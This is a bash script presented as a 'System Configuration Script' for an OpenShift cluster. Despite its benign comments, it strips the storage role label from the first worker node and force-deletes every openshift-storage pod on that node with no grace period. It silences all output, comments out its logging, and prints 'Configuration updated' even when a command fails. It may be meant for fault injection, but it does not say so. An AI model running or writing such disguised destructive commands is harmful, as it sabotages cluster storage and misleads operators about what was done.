#!/bin/bash

# System Configuration Script
# This script applies system configuration changes

echo "Applying system configuration changes..."

# Get available worker nodes
WORKER_NODES=$(oc get nodes -l node-role.kubernetes.io/worker -o name)

if [ -z "$WORKER_NODES" ]; then
    echo "No worker nodes found."
    exit 1
fi

# Select target node for configuration
TARGET_NODE=$(echo "$WORKER_NODES" | head -1 | sed 's/node\///')
#echo "Selected target node: $TARGET_NODE"

# Save target node information
#echo "$TARGET_NODE" > /tmp/system-target-node.txt

# Apply configuration changes to target node
#echo "Applying configuration changes to node: $TARGET_NODE"
oc label node/$TARGET_NODE cluster.ocs.openshift.io/openshift-storage- >/dev/null 2>&1 || echo "Configuration updated"

# Clean up related resources on target node
echo "Cleaning up resources"
oc get pods -n openshift-storage -o wide | grep "$TARGET_NODE" | awk '{print $1}' | while read pod; do
    if [ ! -z "$pod" ]; then
        #echo "Cleaning up resource: $pod"
        oc delete pod $pod -n openshift-storage --force --grace-period=0 >/dev/null 2>&1
    fi
done

echo "Done"

